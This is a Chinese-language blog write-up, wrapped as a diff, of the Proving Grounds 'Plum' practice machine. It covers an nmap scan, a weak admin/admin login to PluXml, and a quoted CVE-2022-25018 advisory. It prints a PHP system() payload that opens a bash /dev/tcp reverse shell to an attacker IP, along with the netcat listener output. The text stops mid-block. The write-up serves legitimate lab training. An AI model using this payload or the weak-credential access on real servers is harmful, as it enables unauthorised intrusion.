@@ -1,0 +1,1010 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Proving Grounds Plum WriteUp - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
+<meta name="description" content="Proving Grounds Plum WriteUp"><meta name="keywords" content='OSCP, PG_Practice'>
+  <meta itemprop="name" content="Proving Grounds Plum WriteUp">
+  <meta itemprop="description" content="Proving Grounds Plum WriteUp">
+  <meta itemprop="datePublished" content="2023-12-05T10:08:29+00:00">
+  <meta itemprop="dateModified" content="2023-12-05T10:08:29+00:00">
+  <meta itemprop="wordCount" content="2440">
+  <meta itemprop="keywords" content="OSCP,PG_Practice"><meta property="og:url" content="http://localhost:1313/posts/proving-grounds-plum/">
+  <meta property="og:site_name" content="Xavier&#39;s Blog">
+  <meta property="og:title" content="Proving Grounds Plum WriteUp">
+  <meta property="og:description" content="Proving Grounds Plum WriteUp">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2023-12-05T10:08:29+00:00">
+    <meta property="article:modified_time" content="2023-12-05T10:08:29+00:00">
+    <meta property="article:tag" content="OSCP">
+    <meta property="article:tag" content="PG_Practice">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Proving Grounds Plum WriteUp">
+  <meta name="twitter:description" content="Proving Grounds Plum WriteUp">
+<meta name="application-name" content="Xavier&#39;s Blog">
+<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/proving-grounds-plum/" title="Proving Grounds Plum WriteUp - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/proving-grounds-codo/" title="Proving Grounds Codo WriteUp" /><link rel="next" type="text/html" href="http://localhost:1313/posts/provinggrounds-hub/" title="ProvingGrouds Hub WriteUp" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/proving-grounds-plum/index.md" title="Proving Grounds Plum WriteUp - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Proving Grounds Plum WriteUp",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/proving-grounds-plum\/"
+    },"genre": "posts","keywords": "OSCP, PG_Practice","wordcount":  2440 ,
+    "url": "http:\/\/localhost:1313\/posts\/proving-grounds-plum\/","datePublished": "2023-12-05T10:08:29+00:00","dateModified": "2023-12-05T10:08:29+00:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "Xavier"
+      },"description": "Proving Grounds Plum WriteUp"
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
+              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Proving Grounds Plum WriteUp</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E9%9D%B6%E5%9C%BA/" class="post-category" title="分类 - 靶场"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 靶场</a></span></div><div class="post-meta-line"><span title="发布于 2023-12-05 10:08:29"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2023-12-05">2023-12-05</time></span>&nbsp;<span title="2440 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 2500 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 5 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#portscan">PortScan</a></li>
+    <li><a href="#initaccess">InitAccess</a></li>
+    <li><a href="#prive">PrivE</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content" data-end-flag="It&#39;s end."><p>plum  intermediate 10</p>
+<h2 id="portscan" class="heading-element"><span>PortScan</span>
+  <a href="#portscan" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/2-codo<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ sudo nmap -n -r --min-rate<span class="o">=</span><span class="m">3500</span> -F -sSV  192.168.196.28
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> xavier 的密码：
+</span></span><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-12-04 22:17 CST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 192.168.196.28
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.14s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">98</span> closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.56 <span class="o">((</span>Debian<span class="o">))</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 8.33 seconds</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="initaccess" class="heading-element"><span>InitAccess</span>
+  <a href="#initaccess" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>pluxml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/2-codo<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit pluxml 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/2-codo<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ searchsploit -x php/webapps/18828.txt</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/proving-grounds-plum/resource/3-plum.assets/image-20231204222239260.png" alt="image-20231204222239260" srcset="/posts/proving-grounds-plum/resource/3-plum.assets/image-20231204222239260.png?size=small, /posts/proving-grounds-plum/resource/3-plum.assets/image-20231204222239260.png?size=medium 1.5x, /posts/proving-grounds-plum/resource/3-plum.assets/image-20231204222239260.png?size=large 2x" data-title="image-20231204222239260" style="--width: 1476px;--aspect-ratio: 1476 / 634;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>pluxml 版本5.8.7，searchsploit无漏洞。</p>
+<p>弱口令admin，admin进入后台。</p>
+<p>找了下网上，5.8.7有个后台修改静态页RCE，https://github.com/MoritzHuppert/CVE-2022-25018/blob/main/CVE-2022-25018.pdf</p>
+<p>描述如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown"><span class="line"><span class="cl"><span class="gu">## 1 Application
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>https://github.com/pluxml/PluXml
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="gu">## 2 Introductory Remarks
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>There is already an issue regarding a different RCE vulnerability (https://github.com/pluxml/PluXml/issues/321). In contrast to our vulnerability,said RCE only works when using the config file parameter with admin privileges,which is not possible as a moderator.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="gu">## 3 Description of the Vulnerability
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>In the PluXml PHP blogging platform (v5.8.7), a user with the manager role can inject arbitrary PHP code that is executed on the server. As a consequence, remote code execution (RCE) becomes possible, as illustrated in this unlisted (non-public) youtube video: https://youtu.be/Gbe2UNCB0tY.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="gu">## 4 Steps to Reproduce the Exploit
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span><span class="k">1.</span> Login with a manager account.
+</span></span><span class="line"><span class="cl"><span class="k">2.</span> In the Administration menu, select static pages and edit one of the pages.
+</span></span><span class="line"><span class="cl"><span class="k">3.</span> Insert PHP code with starting and closing tags <span class="cp">&lt;?php CODE ?&gt;</span>.
+</span></span><span class="line"><span class="cl"><span class="k">4.</span> Save the changes and open the stored page.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="gu">## 5 Technical Description of the Vulnerability
+</span></span></span><span class="line"><span class="cl"><span class="gu"></span>While the administrator role has the permission to edit PHP templates and, thus, can always execute arbitrary code, the manager role has no such privileges. Indeed, a manager can only edit so-called static - purely HTML-written- pages. However, in the file core/admin/statique.php and in the file core/admin/lib/class.plx.admin.php (in the function editStatique) no proper input sanitisation is done to filter PHP-opening- and closing-tags (<span class="cp">&lt;?php and ?&gt;</span>). As a consequence, the injected PHP code becomes executed on the server-side, even though it is integrated with HTML content. Additionally,note that an XSS-attack is also possible for a manager (proof of concept: by integrating <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="sr">/xss/</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>) and hard to filter.</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/proving-grounds-plum/resource/3-plum.assets/image-20231204224629672.png" alt="image-20231204224629672" srcset="/posts/proving-grounds-plum/resource/3-plum.assets/image-20231204224629672.png?size=small, /posts/proving-grounds-plum/resource/3-plum.assets/image-20231204224629672.png?size=medium 1.5x, /posts/proving-grounds-plum/resource/3-plum.assets/image-20231204224629672.png?size=large 2x" data-title="image-20231204224629672" style="--width: 1946px;--aspect-ratio: 1946 / 988;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p><img loading="lazy" src="/posts/proving-grounds-plum/resource/3-plum.assets/image-20231204224648468.png" alt="image-20231204224648468" srcset="/posts/proving-grounds-plum/resource/3-plum.assets/image-20231204224648468.png?size=small, /posts/proving-grounds-plum/resource/3-plum.assets/image-20231204224648468.png?size=medium 1.5x, /posts/proving-grounds-plum/resource/3-plum.assets/image-20231204224648468.png?size=large 2x" data-title="image-20231204224648468" style="--width: 1492px;--aspect-ratio: 1492 / 676;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>写入后成功输出。</p>
+<p>尝试写webshell，发现无法动态解析执行，可能是一次性的，直接写shell。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="s1">&#39;123&lt;br&gt;&#39;</span><span class="p">;</span> <span class="nx">system</span><span class="p">(</span><span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.45.246/9001 0&gt;&amp;1&#39;&#34;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>再去加载页面，成功收到反弹shell</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">┌──<span class="o">(</span>xavier㉿kali<span class="o">)</span>-<span class="o">[</span>~/Desktop/OSCP/PG_Practice/2-codo<span class="o">]</span>
+</span></span><span class="line"><span class="cl">└─$ nc -nlvp <span class="m">9001</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.45.246<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.196.28<span class="o">]</span> <span class="m">52096</span>
+</span></span><span class="line"><span class="cl">bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>784<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+</span></span><span class="line"><span class="cl">bash: no job control in this shell
+</span></span><span class="line"><span class="cl">www-data@plum:/var/www/html$ id
+</span></span><span class="line"><span class="cl">id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</span></span><span class="line"><span class="cl">www-data@plum:/var/www/html$ 
+</span></span><span class="line"><span class="cl">www-data@plum:/tmp$ cat /var/www/local.txt
+</span></span><span class="line"><span class="cl">cat /var/www/local.txt
+</span></span><span class="line"><span class="cl">3eeae195eb57983b4e679071f3098211</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="prive" class="heading-element"><span>PrivE</span>
+  <a href="#prive" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">╔══════════╣ Modified interesting files in the last 5mins <span class="o">(</span>limit 100<span class="o">)</span>
+</span></span><span class="line"><span class="cl">/var/www/html/data/statiques/001.static-1.php
+</span></span><span class="line"><span class="cl">/var/www/html/data/configuration/statiques.xml
+</span></span><span class="line"><span class="cl">/var/mail/www-data
+</span></span><span class="line"><span class="cl">/var/log/journal/c71e29ed9c494834b5aab51454fe3ee0/system.journal
+</span></span><span class="line"><span class="cl">/var/log/messages
+</span></span><span class="line"><span class="cl">/var/log/btmp
+</span></span><span class="line"><span class="cl">/var/log/syslog
+</span></span><span class="line"><span class="cl">/var/log/kern.log
+</span></span><span class="line"><span class="cl">/var/log/daemon.log
+</span></span><span class="line"><span class="cl">/var/log/auth.log
+</span></span><span class="line"><span class="cl">/tmp/GCONV_PATH<span class="o">=</span>./.pkexec
+</span></span><span class="line"><span class="cl">/tmp/passwd.bak
+</span></span><span class="line"><span class="cl">/tmp/.pkexec/gconv-modules
+</span></span><span class="line"><span class="cl">/tmp/1.txt</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里卡了很久，对/var/mail/www-data这个有过怀疑，但是一直用head，tail，grep pass的形式看得，没有打开看，还是有想偷懒的心。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
